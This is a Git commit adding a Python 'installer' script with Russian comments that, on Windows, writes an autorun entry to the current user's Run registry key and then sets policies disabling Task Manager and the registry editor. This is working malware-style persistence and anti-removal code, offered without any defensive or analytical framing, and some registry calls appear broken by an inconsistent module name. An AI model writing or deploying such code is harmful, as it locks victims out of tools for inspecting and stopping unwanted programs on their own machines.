422d209e8b2fa84b8cee03913b7af73e57381332
tretek-prog <70658598+tretek-prog@users.noreply.github.com>
2021-04-20 00:27:16 +0300

    Create installer.py

---
+++ installer.py
@@ -0,0 +1,38 @@
+import winreg as reg
+import os
+from sys import platform
+from winreg import *
+
+# Функция для установки на видовс, которая закидывает файл в реестр автозагрузок, блокирует доступ в реестр
+def win32():
+    # Кидаем в автозагрузки
+    pth = os.path.dirname(os.path.realpath(__file__))
+    p_name = "test_autorun.py"
+    address = os.path.join(pth, p_name)
+    tmp = reg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
+    winreg.SetValue(tmp, None, reg.REG_SZ, address)
+    winreg.CloseKey(tmp)
+    # Создаем sub_key System, т.к. обычно ее нет (на этом этапе нужны права администратора...)
+    winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Policies\\System")
+    # Блокируем доступ в диспетчер задач
+    keyVal = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
+    try:
+        key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
+    except:
+        key = CreateKey(HKEY_CURRENT_USER, keyVal)
+    SetValueEx(key, "DisableTaskMgr", 0, REG_DWORD, 1)
+    CloseKey(key)
+    # Закрываем встроенный редактор реестра
+    keyVal = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
+    try:
+        key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
+    except:
+        key = CreateKey(HKEY_CURRENT_USER, keyVal)
+    SetValueEx(key, "DisableRegistryTools", 0, REG_DWORD, 1)
+    CloseKey(key)
+    
+# Выбор метода установки взависимости от ОС и установка
+if platform == "linux" or platform == "linux2":
+    print("linux")
+elif platform == "win32":
+    win32()
